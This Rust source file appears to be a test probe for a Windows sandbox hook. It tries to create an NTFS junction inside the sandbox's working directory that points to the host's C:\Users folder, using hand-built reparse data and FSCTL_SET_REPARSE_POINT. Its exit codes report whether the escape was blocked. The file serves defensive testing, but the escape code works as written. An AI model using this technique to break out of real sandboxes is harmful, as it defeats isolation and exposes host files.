// Tries to create a junction inside sandbox cwd pointing OUT to host filesystem.
// Without hook: FSCTL_SET_REPARSE_POINT succeeds → reading sandbox\backdoor\X
// transparently reads host\Users\X. Classic FS escape.
// With hook: NtFsControlFile(FSCTL_SET_REPARSE_POINT) returns ACCESS_DENIED →
// DeviceIoControl fails → exit 5.

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use winapi::um::fileapi::CreateFileW;
use winapi::um::fileapi::OPEN_EXISTING;
use winapi::um::handleapi::{INVALID_HANDLE_VALUE, CloseHandle};
use winapi::um::ioapiset::DeviceIoControl;
use winapi::um::winnt::{
    FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE,
    GENERIC_READ, GENERIC_WRITE,
};
use winapi::um::winbase::{FILE_FLAG_BACKUP_SEMANTICS, FILE_FLAG_OPEN_REPARSE_POINT};

const FSCTL_SET_REPARSE_POINT: u32 = 0x900A4;
const IO_REPARSE_TAG_MOUNT_POINT: u32 = 0xA0000003;

fn main() {
    eprintln!("[escape_reparse_create] starting");
    let _ = std::fs::metadata(r"C:\Windows\System32\kernel32.dll");
    for _ in 0..3 { unsafe { winapi::um::synchapi::SleepEx(200, 1); } }

    let cwd = std::env::current_dir().expect("cwd");
    let dir = cwd.join("evil_junction");
    let _ = std::fs::remove_dir_all(&dir);

    if let Err(e) = std::fs::create_dir(&dir) {
        eprintln!("[escape_reparse_create] mkdir failed: {}", e);
        std::process::exit(7);
    }

    let dir_w: Vec<u16> = OsStr::new(&dir).encode_wide().chain(Some(0)).collect();
    unsafe {
        let h = CreateFileW(
            dir_w.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            null_mut(),
            OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
            null_mut(),
        );
        if h == INVALID_HANDLE_VALUE {
            let err = winapi::um::errhandlingapi::GetLastError();
            eprintln!("[escape_reparse_create] open dir failed err={}", err);
            std::process::exit(7);
        }

        let sub_path: Vec<u16> = OsStr::new(r"\??\C:\Users").encode_wide().collect();
        let print_path: Vec<u16> = OsStr::new(r"C:\Users").encode_wide().collect();
        let sub_bytes = sub_path.len() * 2;
        let print_bytes = print_path.len() * 2;

        let mut buf = vec![0u8; 0x10 + sub_bytes + print_bytes + 4];
        buf[0..4].copy_from_slice(&IO_REPARSE_TAG_MOUNT_POINT.to_le_bytes());
        let data_len: u16 = (8 + sub_bytes + print_bytes) as u16;
        buf[4..6].copy_from_slice(&data_len.to_le_bytes());
        buf[8..10].copy_from_slice(&0u16.to_le_bytes());
        buf[10..12].copy_from_slice(&(sub_bytes as u16).to_le_bytes());
        buf[12..14].copy_from_slice(&(sub_bytes as u16).to_le_bytes());
        buf[14..16].copy_from_slice(&(print_bytes as u16).to_le_bytes());
        let sub_ptr = buf.as_mut_ptr().add(0x10) as *mut u16;
        for (i, &w) in sub_path.iter().enumerate() {
            *sub_ptr.add(i) = w;
        }
        let print_ptr = buf.as_mut_ptr().add(0x10 + sub_bytes) as *mut u16;
        for (i, &w) in print_path.iter().enumerate() {
            *print_ptr.add(i) = w;
        }

        let total_size = (0x10 + sub_bytes + print_bytes) as u32;
        let mut bytes_returned: u32 = 0;

        let ok = DeviceIoControl(
            h,
            FSCTL_SET_REPARSE_POINT,
            buf.as_mut_ptr() as *mut _,
            total_size,
            null_mut(),
            0,
            &mut bytes_returned,
            null_mut(),
        );

        if ok == 0 {
            let err = winapi::um::errhandlingapi::GetLastError();
            eprintln!("[escape_reparse_create] blocked: FSCTL_SET_REPARSE_POINT err={}", err);
            CloseHandle(h);
            let _ = std::fs::remove_dir_all(&dir);
            std::process::exit(5);
        }
        eprintln!("[escape_reparse_create] FOUND: junction created — FS escape vector active!");
        CloseHandle(h);
        let _ = std::fs::remove_dir_all(&dir);
        std::process::exit(0);
    }
}
